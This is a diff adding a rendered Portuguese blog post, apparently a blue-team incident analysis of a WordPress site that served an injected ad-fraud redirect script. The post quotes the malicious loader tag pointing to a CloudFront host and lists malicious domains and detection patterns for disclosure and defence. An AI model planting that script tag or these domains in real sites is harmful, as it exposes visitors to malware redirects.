@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=42567&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Redirect Malicioso via Injeção Server-Side: Análise de Caso e Mitigação | techne-blog</title>
+<meta name="keywords" content="wordpress, malware, incident-response, blue-team">
+<meta name="description" content="TL;DR: Site WordPress/Elementor comprometido servindo script de terceiro injetado na origem (não edge/CDN, não client-side), redirecionando visitantes através de um TDS de ad-fraud. Confirmado via curl bruto: a origem entrega o payload. IOCs e passos de detecção/mitigação abaixo.
+
+Contexto
+Site legítimo (Site X — nome retido até fix confirmado, disclosure em andamento) com botão de download redirecionando para destinos variáveis a cada clique. Investigação identificou script injetado no HTML servido, associado a domínio já classificado como malware por soluções de mercado.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:42567/posts/redirect-malicioso-injecao-server-side/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:42567/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:42567/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:42567/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:42567/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:42567/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:42567/posts/redirect-malicioso-injecao-server-side/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:42567/" accesskey="h" title="techne-blog (Alt + H)">
+                <img src="http://localhost:42567/images/logo.png" alt="" aria-label="logo"
+                    height="35">techne-blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:42567/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:42567/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:42567/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Redirect Malicioso via Injeção Server-Side: Análise de Caso e Mitigação
+      <span class="entry-hint" title="Draft">
+        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
+          <path
+            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
+        </svg>
+      </span>
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-08-01 00:00:00 -0400 -04'>1 de agosto de 2026</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><p><strong>TL;DR:</strong> Site WordPress/Elementor comprometido servindo script de terceiro injetado na origem (não edge/CDN, não client-side), redirecionando visitantes através de um TDS de ad-fraud. Confirmado via <code>curl</code> bruto: a origem entrega o payload. IOCs e passos de detecção/mitigação abaixo.</p>
+<hr>
+<h2 id="contexto">Contexto<a hidden class="anchor" aria-hidden="true" href="#contexto">#</a></h2>
+<p>Site legítimo (<strong>Site X</strong> — nome retido até fix confirmado, disclosure em andamento) com botão de download redirecionando para destinos variáveis a cada clique. Investigação identificou script injetado no HTML servido, associado a domínio já classificado como malware por soluções de mercado.</p>
+<h2 id="cadeia-de-evidência">Cadeia de evidência<a hidden class="anchor" aria-hidden="true" href="#cadeia-de-evidência">#</a></h2>
+<p><strong>1. Descartar sendBeacon como causa.</strong> Tráfego de <code>POST</code>/<code>204</code> para domínio externo via <code>navigator.sendBeacon()</code> — API sem capacidade de navegação, apenas telemetria fire-and-forget. Sintoma, não causa.</p>
+<p><strong>2. Descartar client-side.</strong> Reprodução consistente em múltiplos dispositivos, redes (Wi-Fi/mobile), perfis limpos sem extensões. Elimina infecção local por controle de variáveis.</p>
+<p><strong>3. Localizar injeção.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">data-cfasync</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//dpjf9a2rbjbvp.cloudfront.net/?afjpd=1253254&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Fora do padrão de assets nativos da stack (WP emoji loader, Cloudflare Insights visíveis no mesmo bloco). <code>data-cfasync=&quot;false&quot;</code> bypassa Cloudflare Rocket Loader — execução prioritária deliberada, não config incidental.</p>
+<p><strong>4. Confirmar origem vs. edge.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sL -A <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36&#34;</span> https://site-x.exemplo/ -o raw.html
+</span></span><span style="display:flex;"><span>grep -n <span style="color:#e6db74">&#34;dpjf9a2rbjbvp\|cfasync&#34;</span> raw.html
+</span></span></code></pre></div><p>Script presente na resposta HTTP crua (linha 129, imediatamente antes do meta generator do Elementor). Confirma injeção na origem — não CDN, não edge worker, não client rendering.</p>
+<p><strong>5. Corroboração externa.</strong> Domínio de destino observado (<code>aifpleasurebeh.org</code>) classificado como Trojan por Malwarebytes/ThreatDown.</p>
+<h2 id="iocs">IOCs<a hidden class="anchor" aria-hidden="true" href="#iocs">#</a></h2>
+<table>
+	<thead>
+			<tr>
+					<th>Tipo</th>
+					<th>Valor</th>
+					<th>Contexto</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>URL</td>
+					<td><code>dpjf9a2rbjbvp.cloudfront.net/?afjpd=1253254</code></td>
+					<td>Script de payload/redirect</td>
+			</tr>
+			<tr>
+					<td>Domain</td>
+					<td><code>aifpleasurebeh.org</code></td>
+					<td>Destino de redirect, malware confirmado</td>
+			</tr>
+			<tr>
+					<td>Padrão</td>
+					<td><code>&lt;script data-cfasync=&quot;false&quot; src=&quot;//*.cloudfront.net/?*&quot;&gt;</code></td>
+					<td>Assinatura de injeção — subdomínio aleatório sobre infra cloud legítima</td>
+			</tr>
+	</tbody>
+</table>
+<p>Confiança: <strong>A1</strong> (evidência direta, curl + confirmação de fonte externa) para os IOCs acima. Vetor de infecção específico (plugin/hook/credencial) permanece <strong>não confirmado</strong> sem acesso ao servidor para validar.</p>
+<h2 id="mitre-attck">MITRE ATT&amp;CK<a hidden class="anchor" aria-hidden="true" href="#mitre-attck">#</a></h2>
+<ul>
+<li><code>T1189</code> — Drive-by Compromise</li>
+<li><code>T1608.004</code> — Stage Capabilities: Drive-by Target</li>
+</ul>
+<h2 id="detecção--o-que-rodar-agora">Detecção — o que rodar agora<a hidden class="anchor" aria-hidden="true" href="#detecção--o-que-rodar-agora">#</a></h2>
+<p>Se você administra WordPress e quer descartar o mesmo comprometimento:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Grep local nos arquivos</span>
+</span></span><span style="display:flex;"><span>grep -rn <span style="color:#e6db74">&#34;cfasync=\&#34;false\&#34;&#34;</span> /path/to/wp-content /path/to/wp-includes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Verificação de integridade core (via WP-CLI)</span>
+</span></span><span style="display:flex;"><span>wp core verify-checksums
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Diff de hooks suspeitos em footer/head</span>
+</span></span><span style="display:flex;"><span>grep -rn <span style="color:#e6db74">&#34;wp_footer\|wp_head&#34;</span> wp-content/themes/*/functions.php
+</span></span></code></pre></div><p>Bloqueio de rede/proxy: adicionar <code>dpjf9a2rbjbvp.cloudfront.net</code> e <code>aifpleasurebeh.org</code> a blocklists de DNS/firewall enquanto investiga origem.</p>
+<h2 id="mitigação-se-confirmado">Mitigação, se confirmado<a hidden class="anchor" aria-hidden="true" href="#mitigação-se-confirmado">#</a></h2>
+<ol>
+<li>Isolar/backup do site antes de qualquer alteração (preservar evidência).</li>
+<li>Remover a injeção identificada (arquivo/hook/entrada de banco).</li>
+<li>Rotacionar TODAS as credenciais (admin, DB, SFTP/SSH) — assumir comprometimento total até prova contrária.</li>
+<li>Atualizar core, tema e todos os plugins.</li>
+<li>Auditar contas administrativas por usuários não reconhecidos.</li>
+<li>WAF na frente (Cloudflare/Sucuri/Wordfence) para reduzir reexploração automatizada.</li>
+<li>File integrity monitoring pós-remediação — detecção em horas, não meses, na próxima tentativa.</li>
+</ol>
+<h2 id="escopo-e-limitação">Escopo e limitação<a hidden class="anchor" aria-hidden="true" href="#escopo-e-limitação">#</a></h2>
+<p>Coleta 100% passiva: DevTools, view-source, <code>curl</code> padrão. Sem acesso a painel administrativo, banco de dados, ou tentativa de exploração fora do escopo de research externo não autorizado. Vetor exato de comprometimento não confirmado por essa mesma razão.</p>
+<h2 id="disclosure">Disclosure<a hidden class="anchor" aria-hidden="true" href="#disclosure">#</a></h2>
+<p>Reportado ao responsável do site, à Cloudflare (abuse, via <code>cf-ray</code>) e à AWS (abuse, via URL completa da CloudFront distribution — potencial de impacto em outros sites servidos pela mesma campanha). Nome do site a ser divulgado após fix confirmado ou expiração de prazo padrão de disclosure.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:42567/tags/wordpress/">Wordpress</a></li>
+      <li><a href="http://localhost:42567/tags/malware/">Malware</a></li>
+      <li><a href="http://localhost:42567/tags/incident-response/">Incident-Response</a></li>
+      <li><a href="http://localhost:42567/tags/blue-team/">Blue-Team</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:42567/">techne-blog</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
